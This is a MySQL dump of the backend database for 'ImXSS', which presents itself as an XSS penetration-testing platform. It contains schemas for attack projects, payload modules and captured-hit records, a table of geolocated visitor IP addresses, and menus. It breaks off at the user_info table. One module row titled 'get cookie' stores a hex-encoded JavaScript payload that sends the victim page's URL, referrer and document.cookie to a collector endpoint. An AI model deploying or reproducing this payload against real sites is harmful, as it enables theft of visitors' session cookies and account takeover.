/*
Navicat MySQL Data Transfer

Source Server         : blog
Source Server Version : 50719
Source Host           : 54sb.org:3306
Source Database       : imxss

Target Server Type    : MYSQL
Target Server Version : 50719
File Encoding         : 65001

Date: 2017-08-08 09:28:03
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for address_info
-- ----------------------------
DROP TABLE IF EXISTS `address_info`;
CREATE TABLE `address_info` (
  `ip` varchar(32) NOT NULL,
  `country` varchar(64) DEFAULT NULL,
  `area` varchar(64) DEFAULT NULL,
  `region` varchar(64) DEFAULT NULL,
  `city` varchar(64) DEFAULT NULL,
  `isp` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of address_info
-- ----------------------------
INSERT INTO `address_info` VALUES ('101.226.125.104', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.125.111', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.206', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.208', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.216', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.226', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.227', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.238', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.66.192', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.89.121', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.99.195', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.81.117.224', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('103.213.245.207', '香港', '', '香港特别行政区', '', 'Hurricane Electric');
INSERT INTO `address_info` VALUES ('106.187.44.169', '日本', '', '', '', '');
INSERT INTO `address_info` VALUES ('106.19.14.150', '中国', '华中', '湖南省', '长沙市', '电信');
INSERT INTO `address_info` VALUES ('110.152.101.140', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '电信');
INSERT INTO `address_info` VALUES ('110.152.102.193', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '电信');
INSERT INTO `address_info` VALUES ('111.206.221.32', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('112.27.254.1', '中国', '华东', '安徽省', '合肥市', '移动');
INSERT INTO `address_info` VALUES ('112.64.24.162', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('112.66.116.154', '中国', '华南', '海南省', '海口市', '电信');
INSERT INTO `address_info` VALUES ('112.96.109.38', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('113.102.237.61', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('113.102.238.51', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('113.111.9.11', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.119.11.215', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.201.122.247', '中国', '西北', '陕西省', '宝鸡市', '联通');
INSERT INTO `address_info` VALUES ('113.68.113.135', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('114.91.25.104', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.226.181.239', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.231.95.30', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.27.46.239', '中国', '华南', '广东省', '茂名市', '电信');
INSERT INTO `address_info` VALUES ('117.136.40.214', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('117.136.54.125', '中国', '华北', '天津市', '天津市', '移动');
INSERT INTO `address_info` VALUES ('117.40.238.176', '中国', '华东', '江西省', '萍乡市', '电信');
INSERT INTO `address_info` VALUES ('118.114.221.99', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('119.129.224.182', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.104.248', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.104.78', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.16.188', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.16.241', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.17.190', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.17.75', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.15', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.175', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.79', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.131.117.13', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.97.197.2', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('120.85.158.147', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.167', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.17', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.181', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.215', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.31', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.68', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.78', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.76.85', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('121.33.20.24', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.58.69.2', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('122.188.101.29', '中国', '华中', '湖北省', '鄂州市', '联通');
INSERT INTO `address_info` VALUES ('122.190.94.171', '中国', '华中', '湖北省', '荆州市', '联通');
INSERT INTO `address_info` VALUES ('122.190.94.201', '中国', '华中', '湖北省', '荆州市', '联通');
INSERT INTO `address_info` VALUES ('122.224.191.122', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('122.226.188.248', '中国', '华东', '浙江省', '台州市', '电信');
INSERT INTO `address_info` VALUES ('123.151.138.57', '中国', '华北', '天津市', '天津市', '电信');
INSERT INTO `address_info` VALUES ('123.151.153.35', '中国', '华北', '天津市', '天津市', '电信');
INSERT INTO `address_info` VALUES ('123.7.39.40', '中国', '华中', '河南省', '许昌市', '联通');
INSERT INTO `address_info` VALUES ('124.117.223.126', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '电信');
INSERT INTO `address_info` VALUES ('125.70.204.238', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('125.71.39.97', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('127.0.0.1', '未分配或者内网IP', '', '', '', '');
INSERT INTO `address_info` VALUES ('180.109.201.37', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('180.111.117.85', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('180.111.156.236', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('180.153.160.61', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.163.1.46', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.163.2.88', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('180.173.234.46', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('182.149.202.194', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('182.151.203.19', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('182.18.23.7', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('183.131.161.162', '中国', '华东', '浙江省', '湖州市', '电信');
INSERT INTO `address_info` VALUES ('183.22.29.66', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('183.228.0.198', '中国', '西南', '重庆市', '重庆市', '移动');
INSERT INTO `address_info` VALUES ('202.239.38.162', '日本', '', '', '', '');
INSERT INTO `address_info` VALUES ('218.29.101.202', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('218.72.24.57', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('218.77.94.74', '中国', '华中', '湖南省', '益阳市', '电信');
INSERT INTO `address_info` VALUES ('219.137.140.4', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.142.192', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.142.4', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.143.0', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.143.238', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.137.183.195', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('219.143.176.170', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('221.10.28.217', '中国', '西南', '四川省', '成都市', '联通');
INSERT INTO `address_info` VALUES ('221.10.28.219', '中国', '西南', '四川省', '成都市', '联通');
INSERT INTO `address_info` VALUES ('221.232.175.127', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('223.104.63.217', '中国', '华南', '广东省', '东莞市', '移动');
INSERT INTO `address_info` VALUES ('27.19.157.192', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('27.19.179.190', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('36.102.208.33', '中国', '华北', '内蒙古自治区', '', '电信');
INSERT INTO `address_info` VALUES ('36.49.73.172', '中国', '东北', '吉林省', '长春市', '电信');
INSERT INTO `address_info` VALUES ('42.226.101.118', '中国', '华中', '河南省', '新乡市', '联通');
INSERT INTO `address_info` VALUES ('42.226.99.182', '中国', '华中', '河南省', '新乡市', '联通');
INSERT INTO `address_info` VALUES ('43.248.76.252', '中国', '华东', '江苏省', '常州市', '电信');
INSERT INTO `address_info` VALUES ('43.251.37.13', '中国', '西北', '宁夏回族自治区', '中卫市', '联通');
INSERT INTO `address_info` VALUES ('58.17.70.27', '中国', '华东', '江西省', '宜春市', '联通');
INSERT INTO `address_info` VALUES ('58.212.130.35', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('58.215.8.2', '中国', '华东', '江苏省', '无锡市', '电信');
INSERT INTO `address_info` VALUES ('58.217.245.253', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('58.246.121.116', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('59.174.4.156', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('59.78.209.100', '中国', '华东', '上海市', '上海市', '教育网');
INSERT INTO `address_info` VALUES ('61.136.204.186', '中国', '华中', '湖北省', '恩施土家族苗族自治州', '电信');
INSERT INTO `address_info` VALUES ('61.151.226.199', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('61.151.228.22', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('61.163.118.214', '中国', '华中', '河南省', '新乡市', '联通');
INSERT INTO `address_info` VALUES ('61.178.208.93', '中国', '西北', '甘肃省', '张掖市', '电信');
INSERT INTO `address_info` VALUES ('61.186.23.149', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('61.186.24.36', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');

-- ----------------------------
-- Table structure for email_info
-- ----------------------------
DROP TABLE IF EXISTS `email_info`;
CREATE TABLE `email_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `smtp` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `password` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `sendNum` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=41 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of email_info
-- ----------------------------

-- ----------------------------
-- Table structure for email_queue
-- ----------------------------
DROP TABLE IF EXISTS `email_queue`;
CREATE TABLE `email_queue` (
  `unionId` varchar(32) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `context` varchar(2048) DEFAULT NULL,
  `targeEmail` varchar(64) DEFAULT NULL,
  `status` int(11) DEFAULT '0',
  `createTime` datetime DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  `millisecond` bigint(32) DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`unionId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of email_queue
-- ----------------------------

-- ----------------------------
-- Table structure for invite_info
-- ----------------------------
DROP TABLE IF EXISTS `invite_info`;
CREATE TABLE `invite_info` (
  `inviteCode` varchar(32) COLLATE utf8_bin NOT NULL,
  `userId` int(11) DEFAULT NULL,
  `status` int(1) DEFAULT '0',
  `updateTime` datetime DEFAULT NULL,
  PRIMARY KEY (`inviteCode`),
  KEY `invite_user_id_fk` (`userId`),
  KEY `invite_code_index` (`inviteCode`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of invite_info
-- ----------------------------

-- ----------------------------
-- Table structure for letter_info
-- ----------------------------
DROP TABLE IF EXISTS `letter_info`;
CREATE TABLE `letter_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `projectId` int(11) DEFAULT NULL,
  `refUrl` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `unionId` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `ip` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `userId` int(11) NOT NULL,
  `isReaded` int(1) DEFAULT '0',
  `moduleId` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `letter_unionId_index` (`unionId`) USING BTREE,
  KEY `letter_project_id_fk` (`projectId`) USING BTREE,
  KEY `letter_userId_index` (`userId`),
  FULLTEXT KEY `letter_refurl_index` (`refUrl`)
) ENGINE=InnoDB AUTO_INCREMENT=1490 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of letter_info
-- ----------------------------

-- ----------------------------
-- Table structure for letter_paras
-- ----------------------------
DROP TABLE IF EXISTS `letter_paras`;
CREATE TABLE `letter_paras` (
  `paraName` varchar(255) COLLATE utf8_bin NOT NULL,
  `letterId` int(11) NOT NULL,
  `paraValue` text COLLATE utf8_bin,
  `updateTime` datetime DEFAULT NULL,
  PRIMARY KEY (`paraName`,`letterId`),
  KEY `paras_letter_id` (`letterId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of letter_paras
-- ----------------------------

-- ----------------------------
-- Table structure for module_info
-- ----------------------------
DROP TABLE IF EXISTS `module_info`;
CREATE TABLE `module_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `content` text COLLATE utf8_bin,
  `type` int(11) DEFAULT '0',
  `updateTime` datetime DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `module_id_index` (`id`),
  KEY `module_type_index` (`type`),
  KEY `module_all_index` (`userId`,`type`)
) ENGINE=InnoDB AUTO_INCREMENT=58 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of module_info
-- ----------------------------
INSERT INTO `module_info` VALUES ('37', '0', '获取Cookie', 0x7661722078203D206E657720496D61676528293B0D0A747279207B0D0A09766172206D796F70656E6572203D2027273B0D0A096D796F70656E6572203D2077696E646F772E6F70656E65722026262077696E646F772E6F70656E65722E6C6F636174696F6E203F2077696E646F772E6F70656E65722E6C6F636174696F6E0D0A0909093A2027273B0D0A7D206361746368202865727229207B0D0A7D0D0A782E737263203D20277B6170697D3F6C6F636174696F6E3D270D0A09092B2065736361706528646F63756D656E742E6C6F636174696F6E29202B202726746F706C6F636174696F6E3D270D0A09092B2065736361706528746F702E646F63756D656E742E6C6F636174696F6E29202B202726636F6F6B69653D27202B2065736361706528646F63756D656E742E636F6F6B6965290D0A09092B2027266F70656E65723D27202B20657363617065286D796F70656E657229202B20272672656665727265723D270D0A09092B2065736361706528646F63756D656E742E7265666572726572293B, '1', '2017-07-14 08:32:33', '获取Cookie');

-- ----------------------------
-- Table structure for project_info
-- ----------------------------
DROP TABLE IF EXISTS `project_info`;
CREATE TABLE `project_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `moduleId` int(11) DEFAULT NULL,
  `userId` int(11) DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `uri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `sortUri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `openMobile` int(1) DEFAULT '0',
  `openEmail` int(1) DEFAULT '0',
  `ignoreRef` varchar(2048) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `project_module_id_fk` (`moduleId`) USING BTREE,
  KEY `project_user_id_fk` (`userId`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=263 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of project_info
-- ----------------------------

-- ----------------------------
-- Table structure for project_module_mapping
-- ----------------------------
DROP TABLE IF EXISTS `project_module_mapping`;
CREATE TABLE `project_module_mapping` (
  `projectId` int(11) NOT NULL,
  `moduleId` int(11) NOT NULL,
  `mappingUrl` varchar(255) COLLATE utf8_bin NOT NULL,
  `userId` int(11) NOT NULL,
  `id` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`mappingUrl`,`projectId`),
  UNIQUE KEY `mapping_id_index` (`id`) USING BTREE,
  KEY `mappingUrl_index` (`mappingUrl`),
  KEY `mappingUrl_user_index` (`mappingUrl`,`userId`),
  KEY `mappingUrl_user_project_index` (`projectId`,`mappingUrl`,`userId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of project_module_mapping
-- ----------------------------

-- ----------------------------
-- Table structure for setting_info
-- ----------------------------
DROP TABLE IF EXISTS `setting_info`;
CREATE TABLE `setting_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `siteName` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `keywords` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `description` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `copyright` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `openReg` int(1) DEFAULT '1' COMMENT '0未开启 1开启',
  `needInvite` int(1) DEFAULT '0' COMMENT '0不需要 1需要',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of setting_info
-- ----------------------------
INSERT INTO `setting_info` VALUES ('1', 'ImXSS 国内最专业的Xss渗透测试平台', '国内最专业的Xss渗透测试平台  --ImXSS', 'ImXss为etrick研发且开源。是国内最专业的Xss渗透平台', 'Copyright © 2014-2019 Scrum Group 版权所有', '1', '0');

-- ----------------------------
-- Table structure for suffix_info
-- ----------------------------
DROP TABLE IF EXISTS `suffix_info`;
CREATE TABLE `suffix_info` (
  `suffix` varchar(255) NOT NULL,
  `status` int(1) DEFAULT NULL,
  PRIMARY KEY (`suffix`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix_info
-- ----------------------------
INSERT INTO `suffix_info` VALUES ('action', '1');
INSERT INTO `suffix_info` VALUES ('admin', '0');
INSERT INTO `suffix_info` VALUES ('asa', '0');
INSERT INTO `suffix_info` VALUES ('asax', '0');
INSERT INTO `suffix_info` VALUES ('ascx', '0');
INSERT INTO `suffix_info` VALUES ('ashx', '0');
INSERT INTO `suffix_info` VALUES ('asp', '0');
INSERT INTO `suffix_info` VALUES ('aspx', '0');
INSERT INTO `suffix_info` VALUES ('bat', '0');
INSERT INTO `suffix_info` VALUES ('cer', '0');
INSERT INTO `suffix_info` VALUES ('cgi', '0');
INSERT INTO `suffix_info` VALUES ('cgix', '0');
INSERT INTO `suffix_info` VALUES ('cmd', '0');
INSERT INTO `suffix_info` VALUES ('com', '0');
INSERT INTO `suffix_info` VALUES ('csp', '0');
INSERT INTO `suffix_info` VALUES ('csrf', '0');
INSERT INTO `suffix_info` VALUES ('cssx', '0');
INSERT INTO `suffix_info` VALUES ('do', '0');
INSERT INTO `suffix_info` VALUES ('edu', '0');
INSERT INTO `suffix_info` VALUES ('esp', '2');
INSERT INTO `suffix_info` VALUES ('exe', '0');
INSERT INTO `suffix_info` VALUES ('exec', '0');
INSERT INTO `suffix_info` VALUES ('exp', '0');
INSERT INTO `suffix_info` VALUES ('fsp', '0');
INSERT INTO `suffix_info` VALUES ('ftl', '0');
INSERT INTO `suffix_info` VALUES ('gifx', '0');
INSERT INTO `suffix_info` VALUES ('gov', '0');
INSERT INTO `suffix_info` VALUES ('htm', '0');
INSERT INTO `suffix_info` VALUES ('html', '0');
INSERT INTO `suffix_info` VALUES ('iis', '0');
INSERT INTO `suffix_info` VALUES ('jhtml', '0');
INSERT INTO `suffix_info` VALUES ('jpgx', '0');
INSERT INTO `suffix_info` VALUES ('jshx', '0');
INSERT INTO `suffix_info` VALUES ('jspx', '0');
INSERT INTO `suffix_info` VALUES ('jsx', '0');
INSERT INTO `suffix_info` VALUES ('mspx', '0');
INSERT INTO `suffix_info` VALUES ('org', '0');
INSERT INTO `suffix_info` VALUES ('php', '1');
INSERT INTO `suffix_info` VALUES ('phpx', '0');
INSERT INTO `suffix_info` VALUES ('pngx', '0');
INSERT INTO `suffix_info` VALUES ('psp', '0');
INSERT INTO `suffix_info` VALUES ('py', '0');
INSERT INTO `suffix_info` VALUES ('sb', '0');
INSERT INTO `suffix_info` VALUES ('ser', '0');
INSERT INTO `suffix_info` VALUES ('shell', '0');
INSERT INTO `suffix_info` VALUES ('shtml', '0');
INSERT INTO `suffix_info` VALUES ('sos', '0');
INSERT INTO `suffix_info` VALUES ('swf', '0');
INSERT INTO `suffix_info` VALUES ('tmp', '0');
INSERT INTO `suffix_info` VALUES ('txt', '0');
INSERT INTO `suffix_info` VALUES ('vbe', '0');
INSERT INTO `suffix_info` VALUES ('vbs', '0');
INSERT INTO `suffix_info` VALUES ('xhtml', '0');
INSERT INTO `suffix_info` VALUES ('xml', '0');
INSERT INTO `suffix_info` VALUES ('xsp', '0');
INSERT INTO `suffix_info` VALUES ('xss', '0');

-- ----------------------------
-- Table structure for suffix_static
-- ----------------------------
DROP TABLE IF EXISTS `suffix_static`;
CREATE TABLE `suffix_static` (
  `id` int(8) NOT NULL AUTO_INCREMENT,
  `suffix` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix_static
-- ----------------------------
INSERT INTO `suffix_static` VALUES ('1', 'css');
INSERT INTO `suffix_static` VALUES ('2', 'js');
INSERT INTO `suffix_static` VALUES ('3', 'jpg');
INSERT INTO `suffix_static` VALUES ('4', 'gif');
INSERT INTO `suffix_static` VALUES ('5', 'bmp');
INSERT INTO `suffix_static` VALUES ('6', 'ico');
INSERT INTO `suffix_static` VALUES ('7', 'txt');
INSERT INTO `suffix_static` VALUES ('8', 'exe');
INSERT INTO `suffix_static` VALUES ('9', 'zip');
INSERT INTO `suffix_static` VALUES ('10', 'rar');
INSERT INTO `suffix_static` VALUES ('11', '7z');
INSERT INTO `suffix_static` VALUES ('12', 'jpeg');
INSERT INTO `suffix_static` VALUES ('13', 'png');
INSERT INTO `suffix_static` VALUES ('14', 'doc');
INSERT INTO `suffix_static` VALUES ('15', 'ppt');
INSERT INTO `suffix_static` VALUES ('16', 'avi');
INSERT INTO `suffix_static` VALUES ('17', 'mp4');
INSERT INTO `suffix_static` VALUES ('18', 'rmvb');
INSERT INTO `suffix_static` VALUES ('19', 'flv');
INSERT INTO `suffix_static` VALUES ('20', 'woff');
INSERT INTO `suffix_static` VALUES ('21', 'woff2');
INSERT INTO `suffix_static` VALUES ('22', 'eot');
INSERT INTO `suffix_static` VALUES ('23', 'svg');
INSERT INTO `suffix_static` VALUES ('24', 'ttf');
INSERT INTO `suffix_static` VALUES ('25', 'otf');

-- ----------------------------
-- Table structure for sys_menus
-- ----------------------------
DROP TABLE IF EXISTS `sys_menus`;
CREATE TABLE `sys_menus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(64) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `type` int(1) DEFAULT '0',
  `upId` int(11) DEFAULT NULL,
  `seq` int(11) DEFAULT NULL,
  `code` varchar(128) DEFAULT NULL,
  `remark` varchar(1024) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `menu_upId_fk` (`upId`),
  CONSTRAINT `menu_upId_fk` FOREIGN KEY (`upId`) REFERENCES `sys_menus` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=65 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of sys_menus
-- ----------------------------
INSERT INTO `sys_menus` VALUES ('4', '调试中心', '#', '0', null, '4', null, null);
INSERT INTO `sys_menus` VALUES ('28', '运行状态', 'admin/simple/index', '1', '4', '1', 'index', '后台管理首页');
INSERT INTO `sys_menus` VALUES ('29', '资源管理', 'admin/simple/resources', '1', '4', '1', 'resources', '对项目文件进行管理');
INSERT INTO `sys_menus` VALUES ('30', '监听管理', 'admin/simple/monitorList', '1', '4', '2', 'monitorSetting', '对项目方法进行监听');
INSERT INTO `sys_menus` VALUES ('32', '缓存管理', 'admin/simple/cacheManage', '1', '4', '4', 'cacheSetting', '对系统缓存进行清理');
INSERT INTO `sys_menus` VALUES ('48', '用户中心', '#', '0', null, '0', '', '会员中心相关管理');
INSERT INTO `sys_menus` VALUES ('49', '个人设置', 'user/userSetting', '1', '48', '0', 'userSetting', '用户资料修改');
INSERT INTO `sys_menus` VALUES ('50', '信封管理', 'user/letter/letterCenter', '1', '48', '1', 'letterCenter', '信封管理');
INSERT INTO `sys_menus` VALUES ('51', '项目管理', 'user/project/projectCenter', '1', '48', '2', 'projectCenter', '项目管理');
INSERT INTO `sys_menus` VALUES ('52', '模块管理', 'user/module/moduleCenter', '1', '48', '3', 'moduleCenter', '模块管理');
INSERT INTO `sys_menus` VALUES ('53', '公共邮箱', 'user/email/emailCenter', '1', '54', '1', 'emailCenter', '系统公用发信邮箱');
INSERT INTO `sys_menus` VALUES ('54', '公共信息', '#', '0', null, '0', null, null);
INSERT INTO `sys_menus` VALUES ('55', '公共模块', 'user/module/moduleComm', '1', '54', '3', 'moduleComm', '系统公用模块');
INSERT INTO `sys_menus` VALUES ('56', '管理中心', '#', '0', null, '3', '', '管理员模块');
INSERT INTO `sys_menus` VALUES ('57', '用户管理', 'admin/user/userManage', '1', '56', '3', 'userManage', '用户管理');
INSERT INTO `sys_menus` VALUES ('58', '项目管理', 'admin/project/projectManage', '1', '56', '4', 'projectManage', '项目管理');
INSERT INTO `sys_menus` VALUES ('59', '模块管理', 'admin/module/moduleManage', '1', '56', '5', 'moduleManage', '模块管理');
INSERT INTO `sys_menus` VALUES ('60', '信封管理', 'admin/letter/letterManage', '1', '56', '6', 'letterManage', '信封管理');
INSERT INTO `sys_menus` VALUES ('61', '邀请码库', 'admin/invite/inviteManage', '1', '56', '2', 'inviteManage', '邀请码管理');
INSERT INTO `sys_menus` VALUES ('62', '系统设置', 'admin/setting/settingManage', '1', '56', '0', 'settingManage', '系统设置');
INSERT INTO `sys_menus` VALUES ('63', '邮箱管理', 'admin/email/emailManage', '1', '56', '0', 'emailManage', '模块管理');
INSERT INTO `sys_menus` VALUES ('64', '后缀设置', 'admin/suffix/suffixManage', '1', '56', '1', 'suffixManage', '后缀设置');

-- ----------------------------
-- Table structure for user_info
